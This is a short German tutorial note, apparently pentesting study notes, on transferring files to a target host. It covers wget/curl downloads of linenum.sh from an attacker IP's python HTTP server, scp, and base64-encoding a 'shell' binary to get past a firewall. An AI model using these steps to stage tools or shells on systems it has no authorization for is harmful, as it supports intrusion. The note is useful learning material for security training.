Um Daten übertragen zu können von einer Maschine zu einer anderen können wir folgendes machen:
# Using wget
Dafür müssen wir im Verzeichnis wo unsere Datei sich befindet einen `python HTTP Server` laufen lassen, dieser ist zu gleich unser listining server
```shell-session
cd /tmp   #Hier befindet sich die Datei
python3 -m http.server 8000
```

Nun können wir com Zielhost die Datei runterladen
```shell-session
wget http://10.10.14.1:8000/linenum.sh
```
wenn du kein wget hast, kannst du auch mit curl machen:
```shell-session
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

____

# Using SCP
**Voraussetzung wir haben ssh user credentials** 
```shell-session
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

___

# Using BASE64
Wenn du *nicht* Files transferieren kannst, weil zb eine Firewall da ist, kannst du deine Datei in BASE64 Encoden und dies dann senden, z.b. wollen wir eine **Datei** namens shell, `-w` sorgt dafür, dass keine Zeilenumbrüche beim decoden passiert, 
```shell-session
base64 shell -w 0
```
Du kannst nun einfach den output kopieren und beim Zielhost decoden
```shell-session
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

____

# Validierung File Transfer

Um das **File Format zu validieren**:
```shell-session
file dateiname
```

Um sicherzustellen, dass ein file, während des Transfers nicht verändert oder kaputt gegangen ist, kannst du die `md5 hash` zur validierung nehmen, hol dir bei beiden den Md5 hash und gucke ob sie glecih  